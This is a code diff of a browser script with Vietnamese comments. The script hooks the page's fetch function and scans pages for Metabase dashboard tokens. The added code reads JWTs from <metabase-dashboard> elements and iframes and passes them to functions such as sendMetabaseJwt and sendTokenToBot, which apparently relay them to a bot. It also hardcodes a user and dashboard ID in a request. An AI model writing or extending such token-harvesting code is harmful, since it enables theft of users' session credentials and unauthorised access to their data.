@@ -194,8 +194,18 @@
         return originalFetch.apply(this, args);
     };
 
-    function checkIframes() {
+    function checkMetabaseElements() {
         try {
+            // 1. Quét phần tử Web Component <metabase-dashboard token="...">
+            const mbDash = document.querySelector('metabase-dashboard');
+            if (mbDash) {
+                const tok = mbDash.getAttribute('token') || mbDash.token;
+                if (tok && tok.includes('eyJhbGciOi')) {
+                    sendMetabaseJwt(tok, "metabase-dashboard element");
+                }
+            }
+
+            // 2. Quét tất cả iframes
             const iframes = document.querySelectorAll('iframe');
             iframes.forEach(ifm => {
                 const src = ifm.src || '';
@@ -221,8 +231,8 @@
                             "remote-ip": "not_found"
                         },
                         body: JSON.stringify({
-                            dashboardId: "69fee592e08b65ce62cf5aa9",
-                            id: "69fee592e08b65ce62cf5aa9"
+                            user_id: 3007413,
+                            dashboard_id: 221
                         })
                     });
                     const d = await res.json();
@@ -239,7 +249,7 @@
         if (token) {
             sendTokenToBot(token, true);
         }
-        checkIframes();
+        checkMetabaseElements();
         checkBaocaoReportToken();
     }
 
